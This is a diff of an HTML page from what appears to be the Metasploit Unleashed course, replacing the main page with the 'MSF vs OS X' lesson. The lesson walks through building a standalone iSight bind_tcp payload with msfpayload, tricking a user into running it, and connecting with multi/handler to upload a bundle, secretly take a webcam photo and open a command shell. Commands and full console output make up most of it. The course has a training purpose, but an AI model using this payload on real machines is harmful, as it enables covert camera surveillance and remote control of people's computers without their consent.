@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>MSF vs OS X - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="MSF_vs_OS_X" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:MSF_vs_OS_X&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=MSF_vs_OS_X&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=MSF_vs_OS_X&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,249 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>MSF vs OS X</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="MSF_vs_OS_X#column-one">navigation</a>, <a href="MSF_vs_OS_X#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>One of the more interesting things about the Mac platform is how cameras are built into all of the laptops. This fact has not gone unnoticed by Metasploit developers, as there is a very interesting module that will take a picture with the built in camera.
+<br />
+<br />
+Lets see it in action. First we generate a stand alone executable to transfer to a OS X system:
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>msfpayload osx/x86/isight/bind_tcp X > /tmp/osxt2</span>
+Created by msfpayload (http://www.metasploit.com).
+Payload: osx/x86/isight/bind_tcp
+ Length: 144
+Options:</pre>
+<br />
+So, in this scenario we trick the user into executing the executable we have created, then we use 'multi/handler' to connect in and take a picture of the user.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use multi/handler</span>
+msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>set PAYLOAD osx/x86/isight/bind_tcp</span>
+PAYLOAD => osx/x86/isight/bind_tcp
+msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options:
+
+   Name  Current Setting  Required  Description 
+   ----  ---------------  --------  ----------- 
+
+
+Payload options (osx/x86/isight/bind_tcp):
+
+   Name      Current Setting                                  Required  Description                                          
+   ----      ---------------                                  --------  -----------                                          
+   AUTOVIEW  true                                             yes       Automatically open the picture in a browser          
+   BUNDLE    ~/data/isight.bundle  yes       The local path to the iSight Mach-O Bundle to upload 
+   LPORT     4444                                             yes       The local port                                       
+   RHOST                                                      no        The target address                                   
+
+
+Exploit target:
+
+   Id  Name            
+   --  ----            
+   0   Wildcard Target 
+
+
+msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>ifconfig eth0</span>
+<span style='color:#0000FF;'>[*]</span> exec: ifconfig eth0
+
+eth0      Link encap:Ethernet  HWaddr 00:0c:29:a7:f1:c5 
+          inet addr:172.16.104.150  Bcast:172.16.104.255  Mask:255.255.255.0
+          inet6 addr: fe80::20c:29ff:fea7:f1c5/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:234609 errors:4 dropped:0 overruns:0 frame:0
+          TX packets:717103 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000
+          RX bytes:154234515 (154.2 MB)  TX bytes:58858484 (58.8 MB)
+          Interrupt:19 Base address:0x2000
+
+msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>set RHOST 172.16.104.1</span>
+RHOST => 172.16.104.1
+
+msf exploit(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>exploit</span>
+
+<span style='color:#0000FF;'>[*]</span> Starting the payload handler...
+<span style='color:#0000FF;'>[*]</span> Started bind handler
+<span style='color:#0000FF;'>[*]</span> Sending stage (421 bytes)
+<span style='color:#0000FF;'>[*]</span> Sleeping before handling stage...
+<span style='color:#0000FF;'>[*]</span> Uploading bundle (29548 bytes)...
+<span style='color:#0000FF;'>[*]</span> Upload completed.
+<span style='color:#0000FF;'>[*]</span> Downloading photo...
+<span style='color:#0000FF;'>[*]</span> Downloading photo (13571 bytes)...
+<span style='color:#0000FF;'>[*]</span> Photo saved as /root/.msf3/logs/isight/172.16.104.1_20090821.495489022.jpg
+<span style='color:#0000FF;'>[*]</span> Opening photo in a web browser...
+Error: no display specified
+<span style='color:#0000FF;'>[*]</span> Command shell session 2 opened (172.16.104.150:57008 -> 172.16.104.1:4444)
+<span style='color:#0000FF;'>[*]</span> Command shell session 2 closed.
+msf exploit(<span style='color:#ff0000;'>handler</span>) ></pre>
+<br />
+Very interesting! It appears we have a picture! Lets see what it looks like.
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<div class="center"><div class="floatnone"><a href="File:Msf-isight-payload.png" class="image"><img alt="Msf-isight-payload.png" src="http://www.offensive-security.com/w/images/a/a1/Msf-isight-payload.png" width="640" height="480" /></a></div></div>
 <p><br />
 <br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
+Amazing. This is a very powerful feature with can be used for many different purposes. The standardization of the Apple hardware platform has created a well defined platform for attackers to take advantage of.
 <br />
+<br />
+</p>
+<hr />
+<p><br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="MSF_Extended_Usage" title="MSF Extended Usage">MSF Extended Usage</a> &gt; MSF vs OS X</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="PHP_Meterpreter" title="PHP Meterpreter">PHP Meterpreter</a> &#124; <a href="Backdooring_EXE_Files" title="Backdooring EXE Files">Backdooring EXE Files</a> &#124; <a href="Karmetasploit" title="Karmetasploit">Karmetasploit</a> &#124; <strong class="selflink">MSF vs OS X</strong> &#124; <a href="File-Upload_Backdoors" title="File-Upload Backdoors">File-Upload Backdoors</a> &#124; <a href="Building_A_Module" title="Building A Module">Building A Module</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 505/1000000
+Preprocessor generated node count: 2633/1000000
+Post‐expand include size: 3420/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:86-0!*!0!*!*!2!* and timestamp 20131124101317 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=MSF_vs_OS_X&amp;oldid=1534">http://www.offensive-security.com/w/index.php?title=MSF_vs_OS_X&amp;oldid=1534</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:MSF_Extended_Usage&amp;action=edit&amp;redlink=1" class="new" title="Category:MSF Extended Usage (page does not exist)">MSF Extended Usage</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +734,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.128 secs. --></body></html>
